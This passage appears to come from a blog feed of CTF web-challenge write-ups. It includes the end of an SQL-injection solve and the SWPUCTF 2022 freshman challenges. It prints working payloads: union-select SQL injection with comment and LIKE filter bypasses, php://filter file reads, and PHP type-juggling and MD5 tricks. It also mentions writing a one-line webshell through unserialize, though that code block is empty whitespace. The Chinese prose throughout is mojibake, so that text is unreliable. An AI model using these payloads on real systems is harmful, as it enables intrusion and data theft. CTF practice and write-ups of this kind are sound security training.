<p>ç›´æ¥è¾“å…¥?wllm&#x3D;1 æ²¡æœ‰æŠ¥é”™ ?wllm&#x3D;1â€™ æŠ¥é”™<br>ç»è¿‡æµ‹è¯•<code>#</code>æ˜¯æ³¨é‡Šç¬¦ï¼Œ<code>--+</code>ä¼šæŠ¥é”™ï¼Œè€Œä¸”<code>--</code>ä¸æŠ¥é”™ï¼Œè¯´æ˜+ ä¹Ÿå°±æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†<br>ç©ºæ ¼å¯ä»¥ç”¨<code>/**/</code>ä»£æ›¿ï¼Œå‰©ä¸‹çš„æ­¥éª¤å°±å’Œä¹‹å‰åšçš„sqlæ³¨å…¥é¢˜ç›®ä¸€æ ·äº† <code>#</code>ç”¨urlç¼–ç çš„%23ä»£æ›¿<br>1.æµ‹å­—æ®µæ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">3</span>%<span class="number">23</span></span><br><span class="line">?wllm=<span class="number">1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">4</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>
<p>æµ‹åˆ°4çš„æ—¶å€™æŠ¥é”™ï¼Œè¯´æ˜æœ‰ä¸‰åˆ—<br>2.çˆ†åº“</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>()%<span class="number">23</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">2</span></span><br><span class="line">Your <span class="keyword">Password</span>:test_db</span><br></pre></td></tr></table></figure></div>
<p>3.çˆ†è¡¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information.<span class="keyword">schema</span>.<span class="keyword">tables</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·å­ç›´æ¥æŠ¥é”™äº†ï¼Œè¯´æ˜<code>=</code>è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨likeç»•è¿‡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">/?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">tables</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span><span class="string">&#x27;test_db&#x27;</span>%<span class="number">23</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">2</span></span><br><span class="line">Your <span class="keyword">Password</span>:LTLT_flag,users</span><br></pre></td></tr></table></figure></div>
<p>4.çˆ†å­—æ®µ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">/?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">columns</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="built_in">table_name</span><span class="comment">/**/</span><span class="keyword">like</span><span class="comment">/**/</span>%<span class="number">27</span>LTLT_flag%<span class="number">27</span>%<span class="number">23</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">2</span></span><br><span class="line">Your <span class="keyword">Password</span>:id,flag</span><br></pre></td></tr></table></figure></div>
<p>5.çˆ†å€¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>%27<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(flag)<span class="comment">/**/</span>from<span class="comment">/**/</span>test_db.LTLT_flag%23</span><br><span class="line">NSSCTF&#123;<span class="number">68487</span>a7b-abb8</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¯»å–çš„æ—¶å€™è¯»å–ä¸å…¨ï¼Œä½†æ˜¯substrè¢«è¿‡æ»¤äº†ï¼Œè¦ç”¨mid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">MID</span> å‡½æ•°æ˜¯ SQL ä¸­ç”¨æ¥ä»ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æå–å­å­—ç¬¦ä¸²çš„å‡½æ•°ã€‚å®ƒé€šå¸¸ç”¨äºè·å–æŸä¸ªä½ç½®å¼€å§‹çš„å­ä¸²ï¼Œæˆ–è€…åœ¨ç‰¹å®šé•¿åº¦çš„èŒƒå›´å†…æå–å­—ç¬¦ã€‚</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="keyword">mid</span>(group_concat(flag),<span class="number">20</span>,<span class="number">20</span>)<span class="comment">/**/</span><span class="built_in">from</span><span class="comment">/**/</span>test_db.LTLT_flag%<span class="number">23</span></span><br><span class="line"><span class="number">8</span><span class="number">-4</span>f86<span class="number">-8</span>ac0<span class="number">-4440e1</span>d0</span><br><span class="line"></span><br><span class="line">?wllm=<span class="number">-1</span>%<span class="number">27</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="keyword">mid</span>(group_concat(flag),<span class="number">40</span>,<span class="number">20</span>)<span class="comment">/**/</span><span class="built_in">from</span><span class="comment">/**/</span>test_db.LTLT_flag%<span class="number">23</span></span><br><span class="line">b59d&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#å®Œæ•´çš„flag NSSCTF&#123;68487a7b-abb8-4f86-8ac0-4440e1d0b59d&#125;</span></span><br></pre></td></tr></table></figure></div>












]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF_2022æ–°ç”Ÿèµ›(web)WP</title>
    <url>/posts/38113.html</url>
    <content><![CDATA[<p>SWPUCTF_2022æ–°ç”Ÿèµ›webæ–¹å‘wp</p>
<span id="more"></span>
<p>åšé¢˜å¹³å°:<a href="https://www.nssctf.cn/problem">nssctf</a></p>
<h1 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a>ez_ez_php</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure></div>
<p>åªè¦<code>file</code>å‚æ•°å‰ä¸‰ä¸ªæ•°æ˜¯phpå°±åŒ…å«è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥ç”¨phpä¼ªåè®®è¯»æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:26709/?file=php://filter/read=convert.base64-encode/resource=flag</span><br><span class="line">Nice!!!TlNTQ1RGezRiMTAyN2E1LWYwMmYtNDk1MC05NjhhLTNiZTI4NDFiZGE3MH0K</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> TlNTQ1RGezRiMTAyN2E1LWYwMmYtNDk1MC05NjhhLTNiZTI4NDFiZGE3MH0K | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;4b1027a5-f02f-4950-968a-3be2841bda70&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="ez-ez-php-revenge"><a href="#ez-ez-php-revenge" class="headerlink" title="ez_ez_php (revenge)"></a>ez_ez_php (revenge)</h1><p>é¢˜ç›®å’Œä¸Šé¢˜ä¸€æ¨¡ä¸€æ ·<br>ä½†æ˜¯ç°åœ¨ç”¨ä¸Šé¢˜çš„payloadå°±åªæœ‰ä¸€ä¸ªniceæ²¡æœ‰æ˜¾ç¤ºflag,ä½†æ˜¯è¿™é‡Œå°±æ˜¯è·¯å¾„å˜äº†æ”¹æˆæ ¹ç›®å½•ä¸‹çš„flagå°±å¯ä»¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:26620/?file=php://filter/read=convert.base64-encode/resource=/flag</span><br><span class="line">Nice!!!TlNTQ1RGezA3NThlMzNjLWI3MmMtNDIyNy04NzA0LTFiOTcxN2Y3NjI0MH0K</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> TlNTQ1RGezA3NThlMzNjLWI3MmMtNDIyNy04NzA0LTFiOTcxN2Y3NjI0MH0K | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;0758e33c-b72c-4227-8704-1b9717f76240&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="1z-unserialize"><a href="#1z-unserialize" class="headerlink" title="1z_unserialize"></a>1z_unserialize</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;</span><br><span class="line">     </span><br><span class="line">     <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;lt;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$a</span>(<span class="variable language_">$this</span>-&gt;lly);</span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–é¢˜ï¼Œé‚£å°±æ˜¯<code>$lt</code>å˜é‡èµ‹å€¼ç»™<code>$a</code>,ç„¶å<code>$a</code>å¯ä»¥å½“ä½œä¸€ä¸ªå‡½æ•°,å†…å®¹æ˜¯<code>lly</code><br>è¿™é‡Œè¿˜è¦æ³¨æ„ä¸€ä¸‹è¿™ä¸ªç±»æœ‰ä¸‰ä¸ªå˜é‡ï¼Œè™½ç„¶ç”¨åˆ°çš„åªæœ‰ä¸¤ä¸ªï¼Œä½†æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„æ—¶å€™ä¹Ÿè¦æŠŠä¸‰ä¸ªå˜é‡éƒ½å†™å‡ºæ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå°†ä¸€å¥è¯æœ¨é©¬å†™å…¥æ–‡ä»¶shell.php<br><img src="https://pic1.imgdb.cn/item/67b1ff0ad0e0a243d4ffe262.png"><br><img src="https://pic1.imgdb.cn/item/67b1ff7ad0e0a243d4ffe26c.png"><br>åœ¨nssç›®å½•ä¸‹æ‰¾åˆ°flag</p>
<h1 id="funny-php"><a href="#funny-php" class="headerlink" title="funny_php"></a>funny_php</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])&lt;=<span class="number">3</span>&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]&gt;<span class="number">999999999</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;:D&quot;</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;L1&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;:C&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/NSSCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;NSSCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;wow&quot;</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;L2&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Nice!&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;yoxi!&quot;</span>;</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;L3&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;X(&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;G&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;md5_1&#x27;</span>].<span class="string">&quot;\n&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;md5_2&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;L1&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;L2&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;L3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ€åå°±æ˜¯è¦æŠŠ<code>L1</code> <code>L2</code> <code>L3</code>éƒ½è®¾ç½®å°±å¯ä»¥å¾—åˆ°flag</p>
<ol>
<li>L1<br>åªèƒ½ä¸‰ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ•°å€¼è¦å¤§äº999999999ï¼Œæ‰€ä»¥ç”¨ç§‘å­¦è®¡æ•°æ³•2e9</li>
<li>L2<br>è¿™é‡Œpreg_replaceæŠŠæ•æ„Ÿè¯ç½®æ¢ä¸ºç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ç”¨åŒå†™<code>NSSNSSCTFCTF</code>,è¿™æ ·å­ä¸­é—´çš„NSSCTFå°±ä¸ä¼šæ˜¾ç¤º</li>
<li>L3<br>åˆæ˜¯è€ƒæŸ¥ä¸€æ ·çš„md5ï¼Œä½†æ˜¯è¿™é‡Œè¦æ±‚ä¸¤ä¸ªéƒ½æ˜¯çº¯å­—æ¯<br>æ‰€ä»¥å¯ä»¥é€‰<code>EEIZDOI</code> <code>QLTHNDT</code><br><img src="https://pic1.imgdb.cn/item/67b204f4d0e0a243d4ffe2e0.png"></li>
</ol>
<h1 id="funny-web"><a href="#funny-web" class="headerlink" title="funny_web"></a>funny_web</h1><p><img src="https://pic1.imgdb.cn/item/67b2dabed0e0a243d40024e3.png"><br><img src="https://pic1.imgdb.cn/item/67b2dad1d0e0a243d40024e8.png"><br>ç›´æ¥ä»webè¿™è¾¹å…¥æ‰‹ä¸çŸ¥é“è¿™ä¸ªå®éªŒå®¤ååˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€<br>ç›®å½•æ‰«æäº†ä¸€ä¸‹ä¹Ÿæ²¡æœ‰å‘ç°å…¶ä»–çš„ç›®å½•ï¼Œåªèƒ½çœ‹wpå¾—åˆ°ç”¨æˆ·å¯†ç <br>ç”¨æˆ· NSSï¼Œå¯†ç  2122693401<br>å¾—åˆ°é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="string">&#x27;12345&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="string">&#x27;12345&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¿™ä¸ºä½•ç›¸ç­‰åˆä¸ç›¸ç­‰&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¦äº†è§£phpçš„intval()å‡½æ•°ï¼Œ<br>intval() æ˜¯ PHP çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒç”¨äºå°†å˜é‡è½¬æ¢ä¸ºæ•´æ•°ï¼ˆintegerï¼‰ã€‚å®ƒçš„åŸºæœ¬ç”¨æ³•å¦‚ä¸‹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure></div>
<p>$valueï¼ˆå¿…éœ€ï¼‰ï¼šè¦è½¬æ¢çš„å€¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æµ®ç‚¹æ•°ã€å¸ƒå°”å€¼ç­‰ã€‚<br>$baseï¼ˆå¯é€‰ï¼‰ï¼šè¿›åˆ¶ï¼Œé»˜è®¤ä¸º 10ã€‚ä»…å½“ $value æ˜¯å­—ç¬¦ä¸²æ—¶æœ‰æ•ˆï¼Œå¯ç”¨äºè½¬æ¢ä¸åŒè¿›åˆ¶çš„æ•°å­—ï¼ˆå¦‚äºŒè¿›åˆ¶ã€åå…­è¿›åˆ¶ï¼‰ã€‚<br>è¿™é‡Œæœ‰å¤šç§æ–¹æ³•å¯ä»¥ç»•è¿‡invalå‡½æ•°ï¼Œå¯ä»¥ç”¨å°æ•°ç‚¹ï¼Œå­—ç¬¦ç­‰<br><img src="https://pic1.imgdb.cn/item/67b2dc5ad0e0a243d4002585.png"></p>
<h1 id="webdog1-start"><a href="#webdog1-start" class="headerlink" title="webdog1__start"></a>webdog1__start</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Do</span> you really reading <span class="keyword">to</span> <span class="keyword">start</span> be a web dog? <span class="keyword">DO</span> you think you go here <span class="keyword">from</span> <span class="keyword">where</span>?</span><br><span class="line">are you readying <span class="keyword">to</span> <span class="keyword">start</span>?</span><br></pre></td></tr></table></figure></div>
<p>é¡µé¢æºä»£ç ä¸­æœ‰æç¤º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (isset($_GET[&#x27;web&#x27;]))</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    $first=$_GET[&#x27;web&#x27;];</span></span><br><span class="line"><span class="comment">    if ($first==md5($first)) </span></span><br><span class="line"><span class="comment">     </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå»&#x2F;robots.txtä¸­ï¼Œçœ‹åˆ°æœ‰ä¸€ä¸ªf14g.phpæ–‡ä»¶çš„åœ°å€ï¼Œè®¿é—®ä¹‹åè¿˜æ˜¯æ²¡æœ‰ä»€ä¹ˆåˆ«çš„ä¿¡æ¯<br>çœ‹äº†wpæ‰çŸ¥é“è¦å»f12ç½‘ç»œä¸­çš„æ ‡å¤´æ‰¾åˆ°hintã€‚ã€‚ã€‚ã€‚ã€‚<br>ç„¶åæ‰¾åˆ°çœŸæ­£çš„é¢˜ç›®åœ°å€<code>F1l1l1l1l1lag.php</code></p>
